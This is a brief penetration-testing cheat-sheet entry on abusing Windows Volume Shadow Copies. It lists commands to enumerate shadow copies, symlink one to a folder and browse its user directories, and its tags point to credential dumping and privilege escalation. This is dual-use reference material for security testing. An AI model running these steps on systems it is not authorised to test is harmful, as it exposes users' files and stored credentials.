---
title: "Volume Shadow Copies"
date: 2024-8-22
tags: ["Volume Shadow Copies", "privesc", "Windows", "secretsdump", "vsc"]
---

---
### Abuse #1: Recover data from shadow copies 

#### 1. Check

```powershell
vssadmin list shadows
``` 

#### 2. Create symlink and expose the volume

```powershell
cmd /c mklink /d C:\VSS <SHADOW_COPY_VOLUME_PATH>
```

#### 3. Access

```powershell
ls C:\VSS\Users
```

<br>